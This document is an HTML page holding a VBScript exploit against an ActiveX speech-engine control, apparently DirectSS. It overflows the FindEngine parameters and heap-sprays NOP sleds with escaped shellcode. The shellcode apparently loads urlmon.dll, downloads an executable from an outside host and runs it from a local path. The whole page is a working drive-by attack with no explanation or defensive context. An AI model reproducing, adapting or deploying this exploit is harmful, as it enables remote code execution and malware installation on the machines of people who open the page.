<html>
<object classid="clsid:EEE78591-FE22-11D0-8BEF-0060081841DE" id="DirectSS"></OBJECT>
<body>
<script language="vbscript">
on error resume next
s="%u54eb%u758b%u8b3c%u3574%u0378%u56f5%u768b%u0320"
s=s+"%u33f5%u49c9%uad41%udb33%u0f36%u14be%u3828%u74f2" 
s=s+"%uc108%u0dcb%uda03%ueb40%u3bef%u75df%u5ee7%u5e8b" 
s=s+"%u0324%u66dd%u0c8b%u8b4b%u1c5e%udd03%u048b%u038b" 
s=s+"%uc3c5%u7275%u6d6c%u6e6f%u642e%u6c6c%u4300%u5c3a" 
s=s+"%u2e55%u7865%u0065%uc033%u0364%u3040%u0c78%u408b" 
s=s+"%u8b0c%u1c70%u8bad%u0840%u09eb%u408b%u8d34%u7c40" 
s=s+"%u408b%u953c%u8ebf%u0e4e%ue8ec%uff84%uffff%uec83" 
s=s+"%u8304%u242c%uff3c%u95d0%ubf50%u1a36%u702f%u6fe8" 
s=s+"%uffff%u8bff%u2454%u8dfc%uba52%udb33%u5353%ueb52" 
s=s+"%u5324%ud0ff%ubf5d%ufe98%u0e8a%u53e8%uffff%u83ff" 
s=s+"%u04ec%u2c83%u6224%ud0ff%u7ebf%ue2d8%ue873%uff40" 
s=s+"%uffff%uff52%ue8d0%uffd7%uffff"
s=s+"%u7468%u7074%u2f3a%u722f%u6975%u2e32%u3333%u3232%u6f2e%u6772%u782f%u6169%u617a%u2e69%u7865%u0065"
scode = unescape(s) + NOP
 eax= unescape("%ff%13")
ebp= unescape("%ff%13")
eip= unescape("%01%0a")
jnk= string(50,unescape("%13"))
suntzu = string(888,"A") + ebp + eip + eax + jnk
bufferI   = string(9999999,"X")
bufferII  = string(9999999,"Y")
bufferIII = string(9999999,"Z")
bufferIV  = string(9999999,"O")
EngineID= string(200000,"b")
MfgName="default"
ProductName="default"
ModeID= string(199544,unescape("%90")) + scode
ModeName= suntzu
LanguageID=1
Dialect="default"
Speaker="default"
Style=1
Gender=1
Age=1
Features=1
Interfaces=1
EngineFeatures=1
	RankEngineID=1
	RankMfgName=1
	RankProductName=1
	RankModeID=1
	RankModeName=1
	RankLanguage=1
	RankDialect=1
	RankSpeaker=1
	RankStyle=1
	RankGender=1
	RankAge=1
	RankFeatures=1
	RankInterfaces=1
	RankEngineFeatures=1
DirectSS.FindEngine EngineID, MfgName, ProductName, ModeID, ModeName, LanguageID, Dialect, Speaker, Style, Gender, Age, Features, Interfaces, EngineFeatures, RankEngineID, RankMfgName, RankProductName, RankModeID, RankModeName, RankLanguage, RankDialect, RankSpeaker, RankStyle, RankGender, RankAge, RankFeatures, RankInterfaces, RankEngineFeatures
</script>
</body>
</html>

